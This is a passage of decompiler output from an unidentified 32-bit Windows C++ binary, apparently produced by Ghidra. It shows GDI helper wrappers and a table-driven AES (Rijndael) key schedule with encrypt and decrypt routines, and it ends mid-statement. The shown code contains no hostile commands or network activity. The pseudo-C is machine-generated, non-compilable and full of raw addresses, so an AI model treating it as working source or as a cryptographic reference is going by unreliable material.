  Attach((CGdiObject *)this,pHVar1);
  return;
}

undefined4 * __thiscall FUN_00409ea0(void *this,byte param_1)

{
  FUN_00409ec0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00409ec0(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00414258;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x415c00;
  local_4 = 0;
  DeleteObject((CGdiObject *)param_1);
  *param_1 = 0x415bec;
  *in_FS_OFFSET = local_c;
  return;
}

void __thiscall FUN_00409f10(void *this,int param_1)

{
  if (param_1 == 0) {
    SelectGdiObject(*(HDC__ **)((int)this + 4),(void *)0x0);
    return;
  }
  SelectGdiObject(*(HDC__ **)((int)this + 4),*(void **)(param_1 + 4));
  return;
}

void __thiscall
FUN_00409f80(void *this,int param_1,int param_2,int param_3,int param_4,HDC param_5,int param_6,
            int param_7,DWORD param_8)

{
  if (param_5 != (HDC)0x0) {
    param_5 = (HDC)param_5[1].unused;
  }
  BitBlt(*(HDC *)((int)this + 4),param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
  return;
}

void __fastcall FUN_0040a110(undefined4 *param_1)

{
  *(undefined *)(param_1 + 1) = 0;
  *param_1 = 0x41a230;
  return;
}

undefined4 * __thiscall FUN_0040a120(void *this,byte param_1)

{
  FUN_0040a140((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_0040a140(undefined4 *param_1)

{
  *param_1 = 0x41a230;
  return;
}

void __thiscall
FUN_0040a150(void *this,undefined4 *param_1,undefined4 *param_2,int param_3,uint param_4)

{
  byte bVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  int iVar4;
  uint *puVar5;
  uint uVar6;
  uint uVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  uint *puVar12;
  undefined4 *puVar13;
  exception local_c [12];
  
  if (param_1 == (undefined4 *)0x0) {
    param_1 = (undefined4 *)&DAT_004213b4;
    exception(local_c,(char **)&param_1);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
  }
  if (((param_3 != 0x10) && (param_3 != 0x18)) && (param_3 != 0x20)) {
    param_1 = (undefined4 *)&DAT_004213b4;
    exception(local_c,(char **)&param_1);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
  }
  if (((param_4 != 0x10) && (param_4 != 0x18)) && (param_4 != 0x20)) {
    param_1 = (undefined4 *)&DAT_004213b4;
    exception(local_c,(char **)&param_1);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
  }
  *(int *)((int)this + 0x3c8) = param_3;
  *(uint *)((int)this + 0x3cc) = param_4;
  uVar6 = param_4 >> 2;
  puVar3 = param_2;
  puVar13 = (undefined4 *)((int)this + 0x3d0);
  while (uVar6 != 0) {
    uVar6 = uVar6 - 1;
    *puVar13 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar13 = puVar13 + 1;
  }
  param_4 = param_4 & 3;
  while (param_4 != 0) {
    param_4 = param_4 - 1;
    *(undefined *)puVar13 = *(undefined *)puVar3;
    puVar3 = (undefined4 *)((int)puVar3 + 1);
    puVar13 = (undefined4 *)((int)puVar13 + 1);
  }
  uVar6 = *(uint *)((int)this + 0x3cc);
  uVar7 = uVar6 >> 2;
  puVar3 = (undefined4 *)((int)this + 0x3f0);
  while (uVar7 != 0) {
    uVar7 = uVar7 - 1;
    *puVar3 = *param_2;
    param_2 = param_2 + 1;
    puVar3 = puVar3 + 1;
  }
  uVar6 = uVar6 & 3;
  while (uVar6 != 0) {
    uVar6 = uVar6 - 1;
    *(undefined *)puVar3 = *(undefined *)param_2;
    param_2 = (undefined4 *)((int)param_2 + 1);
    puVar3 = (undefined4 *)((int)puVar3 + 1);
  }
  if (*(int *)((int)this + 0x3c8) == 0x10) {
    if (*(int *)((int)this + 0x3cc) == 0x10) {
      iVar8 = 10;
    }
    else {
      iVar8 = (-(uint)(*(int *)((int)this + 0x3cc) != 0x18) & 2) + 0xc;
    }
    *(int *)((int)this + 0x410) = iVar8;
  }
  else {
    if (*(int *)((int)this + 0x3c8) == 0x18) {
      *(int *)((int)this + 0x410) =
           (-(uint)(*(int *)((int)this + 0x3cc) != 0x20) & 0xfffffffe) + 0xe;
    }
    else {
      *(undefined4 *)((int)this + 0x410) = 0xe;
    }
  }
  iVar9 = 0;
  iVar8 = (int)(*(int *)((int)this + 0x3cc) + (*(int *)((int)this + 0x3cc) >> 0x1f & 3U)) >> 2;
  if (-1 < *(int *)((int)this + 0x410)) {
    puVar3 = (undefined4 *)((int)this + 8);
    do {
      iVar11 = iVar8;
      puVar13 = puVar3;
      if (0 < iVar8) {
        while (iVar11 != 0) {
          *puVar13 = 0;
          iVar11 = iVar11 + -1;
          puVar13 = puVar13 + 1;
        }
      }
      iVar9 = iVar9 + 1;
      puVar3 = puVar3 + 8;
    } while (iVar9 <= *(int *)((int)this + 0x410));
  }
  iVar9 = 0;
  if (-1 < *(int *)((int)this + 0x410)) {
    puVar3 = (undefined4 *)((int)this + 0x1e8);
    do {
      iVar11 = iVar8;
      puVar13 = puVar3;
      if (0 < iVar8) {
        while (iVar11 != 0) {
          *puVar13 = 0;
          iVar11 = iVar11 + -1;
          puVar13 = puVar13 + 1;
        }
      }
      iVar9 = iVar9 + 1;
      puVar3 = puVar3 + 8;
    } while (iVar9 <= *(int *)((int)this + 0x410));
  }
  puVar5 = (uint *)((int)this + 0x414);
  iVar9 = (*(int *)((int)this + 0x410) + 1) * iVar8;
  puVar13 = (undefined4 *)
            ((int)(*(int *)((int)this + 0x3c8) + (*(int *)((int)this + 0x3c8) >> 0x1f & 3U)) >> 2);
  puVar3 = param_1;
  param_1 = puVar13;
  if (0 < (int)puVar13) {
    do {
      *puVar5 = (uint)*(byte *)puVar3 << 0x18;
      *puVar5 = *puVar5 | (uint)*(byte *)((int)puVar3 + 1) << 0x10;
      *puVar5 = *puVar5 | (uint)*(byte *)((int)puVar3 + 2) << 8;
      *puVar5 = *puVar5 | (uint)*(byte *)((int)puVar3 + 3);
      param_1 = (undefined4 *)((int)param_1 + -1);
      puVar3 = puVar3 + 1;
      puVar5 = puVar5 + 1;
    } while (param_1 != (undefined4 *)0x0);
  }
  iVar11 = 0;
  if (0 < (int)puVar13) {
    param_1 = (undefined4 *)((int)this + 0x414);
    do {
      if (iVar9 <= iVar11) goto LAB_0040a576;
      iVar4 = iVar11 / iVar8;
      iVar10 = iVar11 % iVar8;
      *(undefined4 *)((int)this + (iVar10 + iVar4 * 8) * 4 + 8) = *param_1;
      iVar11 = iVar11 + 1;
      uVar2 = *param_1;
      param_1 = param_1 + 1;
      *(undefined4 *)((int)this + (iVar10 + (*(int *)((int)this + 0x410) - iVar4) * 8) * 4 + 0x1e8)
           = uVar2;
    } while (iVar11 < (int)puVar13);
  }
  if (iVar11 < iVar9) {
    param_2 = (undefined4 *)&DAT_0041a1b0;
    do {
      uVar6 = *(uint *)((int)this + (int)puVar13 * 4 + 0x410);
      bVar1 = *(byte *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      *(uint *)((int)this + 0x414) =
           *(uint *)((int)this + 0x414) ^
           CONCAT31(CONCAT21(CONCAT11((&DAT_00416fb0)[uVar6 >> 0x10 & 0xff] ^ bVar1,
                                      (&DAT_00416fb0)[uVar6 >> 8 & 0xff]),
                             (&DAT_00416fb0)[uVar6 & 0xff]),(&DAT_00416fb0)[uVar6 >> 0x18]);
      if (puVar13 == (undefined4 *)0x8) {
        puVar5 = (uint *)((int)this + 0x418);
        iVar4 = 3;
        do {
          *puVar5 = *puVar5 ^ puVar5[-1];
          puVar5 = puVar5 + 1;
          iVar4 = iVar4 + -1;
        } while (iVar4 != 0);
        uVar6 = *(uint *)((int)this + 0x420);
        iVar4 = 3;
        *(uint *)((int)this + 0x424) =
             *(uint *)((int)this + 0x424) ^
             CONCAT31(CONCAT21(CONCAT11((&DAT_00416fb0)[uVar6 >> 0x18],
                                        (&DAT_00416fb0)[uVar6 >> 0x10 & 0xff]),
                               (&DAT_00416fb0)[uVar6 >> 8 & 0xff]),(&DAT_00416fb0)[uVar6 & 0xff]);
        puVar5 = (uint *)((int)this + 0x428);
        do {
          *puVar5 = *puVar5 ^ puVar5[-1];
          puVar5 = puVar5 + 1;
          iVar4 = iVar4 + -1;
        } while (iVar4 != 0);
      }
      else {
        if (1 < (int)puVar13) {
          puVar5 = (uint *)((int)this + 0x418);
          iVar4 = (int)puVar13 + -1;
          do {
            *puVar5 = *puVar5 ^ puVar5[-1];
            puVar5 = puVar5 + 1;
            iVar4 = iVar4 + -1;
          } while (iVar4 != 0);
        }
      }
      param_1 = (undefined4 *)0x0;
      if (0 < (int)puVar13) {
        puVar3 = (undefined4 *)((int)this + 0x414);
        do {
          if (iVar9 <= iVar11) goto LAB_0040a576;
          iVar4 = iVar11 / iVar8;
          iVar10 = iVar11 % iVar8;
          *(undefined4 *)((int)this + (iVar10 + iVar4 * 8) * 4 + 8) = *puVar3;
          param_1 = (undefined4 *)((int)param_1 + 1);
          iVar11 = iVar11 + 1;
          *(undefined4 *)
           ((int)this + (iVar10 + (*(int *)((int)this + 0x410) - iVar4) * 8) * 4 + 0x1e8) = *puVar3;
          puVar3 = puVar3 + 1;
        } while ((int)param_1 < (int)puVar13);
      }
    } while (iVar11 < iVar9);
  }
LAB_0040a576:
  param_4 = 1;
  if (1 < *(int *)((int)this + 0x410)) {
    puVar5 = (uint *)((int)this + 0x208);
    do {
      puVar12 = puVar5;
      iVar9 = iVar8;
      if (0 < iVar8) {
        do {
          uVar6 = *puVar12;
          iVar9 = iVar9 + -1;
          *puVar12 = *(uint *)(&DAT_004191b0 + (uVar6 >> 0x18) * 4) ^
                     *(uint *)(&DAT_004195b0 + (uVar6 >> 0x10 & 0xff) * 4) ^
                     *(uint *)(&DAT_004199b0 + (uVar6 >> 8 & 0xff) * 4) ^
                     *(uint *)(&DAT_00419db0 + (uVar6 & 0xff) * 4);
          puVar12 = puVar12 + 1;
        } while (iVar9 != 0);
      }
      param_4 = param_4 + 1;
      puVar5 = puVar5 + 8;
    } while ((int)param_4 < *(int *)((int)this + 0x410));
  }
  *(undefined *)((int)this + 4) = 1;
  return;
}

void __thiscall FUN_0040a610(void *this,byte *param_1,byte *param_2)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint *puVar6;
  uint uVar7;
  uint local_24;
  uint local_20;
  uint local_1c;
  exception local_c [12];
  
  if (*(char *)((int)this + 4) != '\0') {
    local_1c = ((uint)*param_1 << 0x18 | (uint)param_1[1] << 0x10 | (uint)param_1[2] << 8 |
               (uint)param_1[3]) ^ *(uint *)((int)this + 8);
    local_20 = ((uint)param_1[4] << 0x18 | (uint)param_1[5] << 0x10 | (uint)param_1[6] << 8 |
               (uint)param_1[7]) ^ *(uint *)((int)this + 0xc);
    uVar4 = ((uint)param_1[8] << 0x18 | (uint)param_1[9] << 0x10 | (uint)param_1[10] << 8 |
            (uint)param_1[0xb]) ^ *(uint *)((int)this + 0x10);
    local_24 = *(uint *)((int)this + 0x14) ^
               ((uint)CONCAT11(param_1[0xe],param_1[0xf]) |
               (uint)param_1[0xc] << 0x18 | (uint)param_1[0xd] << 0x10);
    iVar1 = *(int *)((int)this + 0x410);
    if (1 < iVar1) {
      param_1 = (byte *)(iVar1 + -1);
      uVar3 = local_24;
      uVar5 = uVar4;
      puVar6 = (uint *)((int)this + 0x30);
      do {
        uVar7 = *(uint *)(&DAT_004179b0 + (uVar3 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_004175b0 + (uVar5 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_004171b0 + (local_20 >> 0x18) * 4) ^
                *(uint *)(&DAT_00417db0 + (local_1c & 0xff) * 4) ^ puVar6[-1];
        uVar4 = *(uint *)(&DAT_004175b0 + (uVar3 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_004171b0 + (uVar5 >> 0x18) * 4) ^
                *(uint *)(&DAT_004179b0 + (local_1c >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00417db0 + (local_20 & 0xff) * 4) ^ *puVar6;
        local_24 = *(uint *)(&DAT_004171b0 + (uVar3 >> 0x18) * 4) ^
                   *(uint *)(&DAT_004179b0 + (local_20 >> 8 & 0xff) * 4) ^
                   *(uint *)(&DAT_004175b0 + (local_1c >> 0x10 & 0xff) * 4) ^
                   *(uint *)(&DAT_00417db0 + (uVar5 & 0xff) * 4) ^ puVar6[1];
        local_1c = *(uint *)(&DAT_004179b0 + (uVar5 >> 8 & 0xff) * 4) ^
                   *(uint *)(&DAT_004175b0 + (local_20 >> 0x10 & 0xff) * 4) ^
                   *(uint *)(&DAT_004171b0 + (local_1c >> 0x18) * 4) ^
                   *(uint *)(&DAT_00417db0 + (uVar3 & 0xff) * 4) ^ puVar6[-2];
        param_1 = param_1 + -1;
        uVar3 = local_24;
        uVar5 = uVar4;
        puVar6 = puVar6 + 8;
        local_20 = uVar7;
      } while (param_1 != (byte *)0x0);
    }
    uVar2 = *(undefined4 *)(iVar1 * 0x20 + 8 + (int)this);
    iVar1 = iVar1 * 0x20 + 8 + (int)this;
    *param_2 = (&DAT_00416fb0)[local_1c >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[1] = (&DAT_00416fb0)[local_20 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_1._0_1_ = (byte)uVar2;
    param_2[2] = (&DAT_00416fb0)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    param_2[3] = (&DAT_00416fb0)[local_24 & 0xff] ^ (byte)param_1;
    uVar2 = *(undefined4 *)(iVar1 + 4);
    param_2[4] = (&DAT_00416fb0)[local_20 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[5] = (&DAT_00416fb0)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_1._0_1_ = (byte)uVar2;
    param_2[6] = (&DAT_00416fb0)[local_24 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    param_2[7] = (&DAT_00416fb0)[local_1c & 0xff] ^ (byte)param_1;
    uVar2 = *(undefined4 *)(iVar1 + 8);
    param_2[8] = (&DAT_00416fb0)[uVar4 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[9] = (&DAT_00416fb0)[local_24 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_1._0_1_ = (byte)uVar2;
    param_2[10] = (&DAT_00416fb0)[local_1c >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    param_2[0xb] = (&DAT_00416fb0)[local_20 & 0xff] ^ (byte)param_1;
    uVar2 = *(undefined4 *)(iVar1 + 0xc);
    param_2[0xc] = (&DAT_00416fb0)[local_24 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[0xd] = (&DAT_00416fb0)[local_1c >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[0xe] = (&DAT_00416fb0)[local_20 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    param_1._0_1_ = (byte)uVar2;
    param_2[0xf] = (&DAT_00416fb0)[uVar4 & 0xff] ^ (byte)param_1;
    return;
  }
  exception(local_c,&this_004213a8);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
}

void __thiscall FUN_0040a9d0(void *this,uint *param_1,byte *param_2)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint local_28;
  uint local_24;
  uint local_20;
  int local_14;
  exception local_c [12];
  
  if (*(char *)((int)this + 4) != '\0') {
    uVar4 = ((uint)*(byte *)param_1 << 0x18 | (uint)*(byte *)((int)param_1 + 1) << 0x10 |
             (uint)*(byte *)((int)param_1 + 2) << 8 | (uint)*(byte *)((int)param_1 + 3)) ^
            *(uint *)((int)this + 0x1e8);
    local_28 = ((uint)*(byte *)(param_1 + 1) << 0x18 | (uint)*(byte *)((int)param_1 + 5) << 0x10 |
                (uint)*(byte *)((int)param_1 + 6) << 8 | (uint)*(byte *)((int)param_1 + 7)) ^
               *(uint *)((int)this + 0x1ec);
    local_20 = ((uint)*(byte *)(param_1 + 2) << 0x18 | (uint)*(byte *)((int)param_1 + 9) << 0x10 |
                (uint)*(byte *)((int)param_1 + 10) << 8 | (uint)*(byte *)((int)param_1 + 0xb)) ^
               *(uint *)((int)this + 0x1f0);
    iVar1 = *(int *)((int)this + 0x410);
    local_24 = ((uint)CONCAT11(*(undefined *)((int)param_1 + 0xe),*(undefined *)((int)param_1 + 0xf)
                              ) |
               (uint)*(byte *)(param_1 + 3) << 0x18 | (uint)*(byte *)((int)param_1 + 0xd) << 0x10) ^
               *(uint *)((int)this + 500);
    if (1 < iVar1) {
      local_14 = iVar1 + -1;
      uVar3 = local_20;
      uVar5 = local_24;
      param_1 = (uint *)((int)this + 0x210);
      do {
        uVar6 = *(uint *)(&DAT_004189b0 + (uVar5 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_004181b0 + (local_28 >> 0x18) * 4) ^
                *(uint *)(&DAT_004185b0 + (uVar4 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_00418db0 + (uVar3 & 0xff) * 4) ^ param_1[-1];
        local_20 = *(uint *)(&DAT_004181b0 + (uVar3 >> 0x18) * 4) ^
                   *(uint *)(&DAT_004185b0 + (local_28 >> 0x10 & 0xff) * 4) ^
                   *(uint *)(&DAT_004189b0 + (uVar4 >> 8 & 0xff) * 4) ^
                   *(uint *)(&DAT_00418db0 + (uVar5 & 0xff) * 4) ^ *param_1;
        local_24 = *(uint *)(&DAT_004181b0 + (uVar5 >> 0x18) * 4) ^
                   *(uint *)(&DAT_004185b0 + (uVar3 >> 0x10 & 0xff) * 4) ^
                   *(uint *)(&DAT_004189b0 + (local_28 >> 8 & 0xff) * 4) ^
                   *(uint *)(&DAT_00418db0 + (uVar4 & 0xff) * 4) ^ param_1[1];
        uVar4 = *(uint *)(&DAT_004185b0 + (uVar5 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_004189b0 + (uVar3 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_004181b0 + (uVar4 >> 0x18) * 4) ^
                *(uint *)(&DAT_00418db0 + (local_28 & 0xff) * 4) ^ param_1[-2];
        local_14 = local_14 + -1;
        uVar3 = local_20;
        uVar5 = local_24;
        param_1 = param_1 + 8;
        local_28 = uVar6;
      } while (local_14 != 0);
    }
    uVar2 = *(undefined4 *)(iVar1 * 0x20 + 0x1e8 + (int)this);
    iVar1 = iVar1 * 0x20 + 0x1e8 + (int)this;
    *param_2 = (&DAT_004170b0)[uVar4 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[1] = (&DAT_004170b0)[local_24 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_1._0_1_ = (byte)uVar2;
    param_2[2] = (&DAT_004170b0)[local_20 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    param_2[3] = (&DAT_004170b0)[local_28 & 0xff] ^ (byte)param_1;
    uVar2 = *(undefined4 *)(iVar1 + 4);
    param_2[4] = (&DAT_004170b0)[local_28 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[5] = (&DAT_004170b0)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_1._0_1_ = (byte)uVar2;
    param_2[6] = (&DAT_004170b0)[local_24 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    param_2[7] = (&DAT_004170b0)[local_20 & 0xff] ^ (byte)param_1;
    uVar2 = *(undefined4 *)(iVar1 + 8);
    param_2[8] = (&DAT_004170b0)[local_20 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[9] = (&DAT_004170b0)[local_28 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_1._0_1_ = (byte)uVar2;
    param_2[10] = (&DAT_004170b0)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    param_2[0xb] = (&DAT_004170b0)[local_24 & 0xff] ^ (byte)param_1;
    uVar2 = *(undefined4 *)(iVar1 + 0xc);
    param_2[0xc] = (&DAT_004170b0)[local_24 >> 0x18] ^ (byte)((uint)uVar2 >> 0x18);
    param_2[0xd] = (&DAT_004170b0)[local_20 >> 0x10 & 0xff] ^ (byte)((uint)uVar2 >> 0x10);
    param_2[0xe] = (&DAT_004170b0)[local_28 >> 8 & 0xff] ^ (byte)((uint)uVar2 >> 8);
    param_1._0_1_ = (byte)uVar2;
    param_2[0xf] = (&DAT_004170b0)[uVar4 & 0xff] ^ (byte)param_1;
    return;
  }
  exception(local_c,&this_004213a8);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
}

void __thiscall FUN_0040adc0(void *this,uint *param_1,byte *param_2)

{
  undefined4 uVar1;
  int iVar2;
  uint *puVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  undefined4 *puVar7;
  byte *pbVar8;
  uint uVar9;
  undefined4 *puVar10;
  int iVar11;
  uint *local_30;
  uint *local_28;
  int local_24;
  exception local_c [12];
  
  if (*(char *)((int)this + 4) == '\0') {
    exception(local_c,&this_004213a8);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
  }
  iVar5 = *(int *)((int)this + 0x3cc);
  if (iVar5 != 0x10) {
    iVar5 = (int)(iVar5 + (iVar5 >> 0x1f & 3U)) >> 2;
    if (iVar5 == 4) {
      iVar2 = 0;
    }
    else {
      iVar2 = (uint)(iVar5 != 6) + 1;
    }
    iVar4 = (&DAT_0041a1d8)[iVar2 * 8];
    iVar11 = (&DAT_0041a1e0)[iVar2 * 8];
    iVar2 = (&DAT_0041a1e8)[iVar2 * 8];
    if (0 < iVar5) {
      local_30 = (uint *)((int)this + 8);
      puVar3 = (uint *)((int)this + 0x454);
      local_28 = (uint *)iVar5;
      do {
        *puVar3 = (uint)*(byte *)param_1 << 0x18;
        uVar9 = *puVar3 | (uint)*(byte *)((int)param_1 + 1) << 0x10;
        *puVar3 = uVar9;
        *puVar3 = uVar9 | (uint)*(byte *)((int)param_1 + 2) << 8;
        *puVar3 = *puVar3 | (uint)*(byte *)((int)param_1 + 3);
        param_1 = param_1 + 1;
        *puVar3 = *puVar3 ^ *local_30;
        local_30 = local_30 + 1;
        local_28 = (uint *)((int)local_28 + -1);
        puVar3 = puVar3 + 1;
      } while (local_28 != (uint *)0x0);
    }
    local_24 = 1;
    if (1 < *(int *)((int)this + 0x410)) {
      param_1 = (uint *)((int)this + 0x28);
      do {
        if (0 < iVar5) {
          local_28 = param_1;
          iVar6 = iVar4;
          puVar3 = (uint *)((int)this + 0x434);
          local_30 = (uint *)iVar5;
          do {
            uVar9 = *local_28;
            local_28 = local_28 + 1;
            *puVar3 = *(uint *)(&DAT_004179b0 +
                               (uint)*(byte *)((int)this +
                                              (((iVar11 - iVar4) + iVar6) % iVar5) * 4 + 0x455) * 4)
                      ^ *(uint *)(&DAT_00417db0 +
                                 (*(uint *)((int)this +
                                           (((iVar2 - iVar4) + iVar6) % iVar5) * 4 + 0x454) & 0xff)
                                 * 4) ^
                      *(uint *)(&DAT_004175b0 +
                               (uint)*(byte *)((int)this + (iVar6 % iVar5) * 4 + 0x456) * 4) ^
                      *(uint *)(&DAT_004171b0 + (uint)*(byte *)((int)puVar3 + 0x23) * 4) ^ uVar9;
            iVar6 = iVar6 + 1;
            local_30 = (uint *)((int)local_30 + -1);
            puVar3 = puVar3 + 1;
          } while (local_30 != (uint *)0x0);
        }
        iVar6 = iVar5;
        puVar7 = (undefined4 *)((int)this + 0x434);
        puVar10 = (undefined4 *)((int)this + 0x454);
        while (iVar6 != 0) {
          iVar6 = iVar6 + -1;
          *puVar10 = *puVar7;
          puVar7 = puVar7 + 1;
          puVar10 = puVar10 + 1;
        }
        local_24 = local_24 + 1;
        param_1 = param_1 + 8;
      } while (local_24 < *(int *)((int)this + 0x410));
    }
    param_1 = (uint *)0x0;
    if (0 < iVar5) {
      iVar4 = iVar4 - iVar11;
      iVar2 = iVar2 - iVar11;
      pbVar8 = param_2;
      param_2 = (byte *)((int)this + 0x454);
      do {
        uVar1 = *(undefined4 *)
                 ((int)this + (int)(param_1 + *(int *)((int)this + 0x410) * 2) * 4 + 8);
        *pbVar8 = (&DAT_00416fb0)[param_2[3]] ^ (byte)((uint)uVar1 >> 0x18);
        pbVar8[1] = (&DAT_00416fb0)[*(byte *)((int)this + ((iVar4 + iVar11) % iVar5) * 4 + 0x456)] ^
                    (byte)((uint)uVar1 >> 0x10);
        pbVar8[2] = (&DAT_00416fb0)[*(byte *)((int)this + (iVar11 % iVar5) * 4 + 0x455)] ^
                    (byte)((uint)uVar1 >> 8);
        pbVar8[3] = (&DAT_00416fb0)
                    [*(uint *)((int)this + ((iVar2 + iVar11) % iVar5) * 4 + 0x454) & 0xff] ^
                    (byte)uVar1;
        pbVar8 = pbVar8 + 4;
        param_1 = (uint *)((int)param_1 + 1);
        param_2 = param_2 + 4;
        iVar11 = iVar11 + 1;
      } while ((int)param_1 < iVar5);
    }
    return;
  }
  FUN_0040a610(this,(byte *)param_1,param_2);
  return;
}

void __thiscall FUN_0040b0c0(void *this,uint *param_1,byte *param_2)

{
  undefined4 uVar1;
  int iVar2;
  uint *puVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  undefined4 *puVar7;
  byte *pbVar8;
  uint uVar9;
  undefined4 *puVar10;
  int iVar11;
  uint *local_30;
  uint *local_28;
  int local_24;
  exception local_c [12];
  
  if (*(char *)((int)this + 4) == '\0') {
    exception(local_c,&this_004213a8);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
  }
  iVar5 = *(int *)((int)this + 0x3cc);
  if (iVar5 != 0x10) {
    iVar5 = (int)(iVar5 + (iVar5 >> 0x1f & 3U)) >> 2;
    if (iVar5 == 4) {
      iVar2 = 0;
    }
    else {
      iVar2 = (uint)(iVar5 != 6) + 1;
    }
    iVar4 = (&DAT_0041a1dc)[iVar2 * 8];
    iVar11 = (&DAT_0041a1e4)[iVar2 * 8];
    iVar2 = (&DAT_0041a1ec)[iVar2 * 8];
    if (0 < iVar5) {
      local_30 = (uint *)((int)this + 0x1e8);
      puVar3 = (uint *)((int)this + 0x454);
      local_28 = (uint *)iVar5;
      do {
        *puVar3 = (uint)*(byte *)param_1 << 0x18;
        uVar9 = *puVar3 | (uint)*(byte *)((int)param_1 + 1) << 0x10;
        *puVar3 = uVar9;
        *puVar3 = uVar9 | (uint)*(byte *)((int)param_1 + 2) << 8;
        *puVar3 = *puVar3 | (uint)*(byte *)((int)param_1 + 3);
        param_1 = param_1 + 1;
        *puVar3 = *puVar3 ^ *local_30;
        local_30 = local_30 + 1;
        local_28 = (uint *)((int)local_28 + -1);
        puVar3 = puVar3 + 1;
      } while (local_28 != (uint *)0x0);
    }
    local_24 = 1;
    if (1 < *(int *)((int)this + 0x410)) {
      param_1 = (uint *)((int)this + 0x208);
      do {
        if (0 < iVar5) {
          local_28 = param_1;
          iVar6 = iVar4;
          puVar3 = (uint *)((int)this + 0x434);
          local_30 = (uint *)iVar5;
          do {
            uVar9 = *local_28;
            local_28 = local_28 + 1;
            *puVar3 = *(uint *)(&DAT_004189b0 +
                               (uint)*(byte *)((int)this +
                                              (((iVar11 - iVar4) + iVar6) % iVar5) * 4 + 0x455) * 4)
                      ^ *(uint *)(&DAT_00418db0 +
                                 (*(uint *)((int)this +
                                           (((iVar2 - iVar4) + iVar6) % iVar5) * 4 + 0x454) & 0xff)
                                 * 4) ^
                      *(uint *)(&DAT_004185b0 +
                               (uint)*(byte *)((int)this + (iVar6 % iVar5) * 4 + 0x456) * 4) ^
                      *(uint *)(&DAT_004181b0 + (uint)*(byte *)((int)puVar3 + 0x23) * 4) ^ uVar9;
            iVar6 = iVar6 + 1;
            local_30 = (uint *)((int)local_30 + -1);
            puVar3 = puVar3 + 1;
          } while (local_30 != (uint *)0x0);
        }
        iVar6 = iVar5;
        puVar7 = (undefined4 *)((int)this + 0x434);
        puVar10 = (undefined4 *)((int)this + 0x454);
        while (iVar6 != 0) {
          iVar6 = iVar6 + -1;
          *puVar10 = *puVar7;
          puVar7 = puVar7 + 1;
          puVar10 = puVar10 + 1;
        }
        local_24 = local_24 + 1;
        param_1 = param_1 + 8;
      } while (local_24 < *(int *)((int)this + 0x410));
    }
    param_1 = (uint *)0x0;
    if (0 < iVar5) {
      iVar4 = iVar4 - iVar11;
      iVar2 = iVar2 - iVar11;
      pbVar8 = param_2;
      param_2 = (byte *)((int)this + 0x454);
      do {
        uVar1 = *(undefined4 *)
                 ((int)this + (int)(param_1 + *(int *)((int)this + 0x410) * 2) * 4 + 0x1e8);
        *pbVar8 = (&DAT_004170b0)[param_2[3]] ^ (byte)((uint)uVar1 >> 0x18);
        pbVar8[1] = (&DAT_004170b0)[*(byte *)((int)this + ((iVar4 + iVar11) % iVar5) * 4 + 0x456)] ^
                    (byte)((uint)uVar1 >> 0x10);
